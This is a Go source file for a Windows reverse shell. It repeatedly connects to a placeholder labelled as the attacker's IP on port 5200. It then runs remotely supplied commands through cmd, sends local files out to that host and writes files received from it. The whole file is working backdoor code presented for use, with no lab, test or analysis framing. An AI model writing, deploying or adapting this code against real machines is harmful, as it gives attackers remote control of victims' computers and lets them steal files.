package main

import (
	"encoding/json"
	"fmt"
	"net"
	"time"
	"bytes"
	"os/exec"
	"os"
)

func main() {
	command := ""

	conn, err := net.DialTimeout("tcp", "<<Put attackers IP here>>:5200", time.Duration(1*time.Second))

	if err != nil {
		for {
			conn, err = net.DialTimeout("tcp", "<<Put attackers IP here>>:5200", time.Duration(1*time.Second))

			if err == nil {
				break
			}

			time.Sleep(2 * time.Second)
		}

	}

	shell(conn, command)
}

func shell(conn net.Conn, command string) {

for{

	command = recieve_data(conn)

	_command := ""

	for i:=1; i<len(command)-1; i++{
		_command += string(command[i])
	}

	if _command == "quit"{
		return 
	}else if (len(_command) >= 3 &&_command[:3] == "cd "){
		os.Chdir(_command[3:])
	}else if (len(_command)>=8 && _command[:8] =="download"){
		upload_file(_command[9:], conn)
		conn.Close()
		time.Sleep(1*time.Second)
		conn, _ = net.DialTimeout("tcp", "<<Put attackers IP here>>:5200", time.Duration(1*time.Second))
	}else if (len(_command)>=6 && _command[:6] =="upload"){
		download_file(_command[7:], conn)

		conn.Close()
		time.Sleep(1*time.Second)
		conn, _ = net.DialTimeout("tcp", "<<Put attackers IP here>>:5200", time.Duration(1*time.Second))

	}
		send_data(conn, basic_commants(_command))	
}
}

func send_data(conn net.Conn, command_output string) {
	jsondata, _ := json.Marshal(command_output)
	conn.Write([]byte(jsondata))
}

func recieve_data(conn net.Conn) string {

	var buffer []byte = make([]byte, 1024)
	cargo, _ := conn.Read(buffer)

	return string(buffer[:cargo])

}

func basic_commants(command string) string{

	cmd := exec.Command("cmd", "/c", command)
	
	cmd.Dir = "."
	
	str, _ := cmd.Output()

	return string(bytes.ReplaceAll(str,[]byte{10}, []byte{32}))
}

func download_file(download string, conn net.Conn){

	var buffer []byte = make([]byte,1024)
	conn.SetReadDeadline(time.Now().Add(1 * time.Second))
	file, err_file := os.Create(download)

	if err_file != nil {
		return
	}

	for {
		cargo, err_conn := conn.Read(buffer)

		file.Write([]byte(buffer[:cargo]))
		if err_conn != nil {
			break
		}

	}
	file.Close()	
}

func upload_file(upload string, conn net.Conn){
	
	var buffer []byte = make([]byte, 1024)
	file , err_file := os.Open(upload)

	if err_file != nil{
		return
	}

	for {
		cargo, err_file := file.Read(buffer)

		conn.Write([]byte(buffer[:cargo]))
		if err_file != nil{
			break
		}
	}
	file.Close()

}
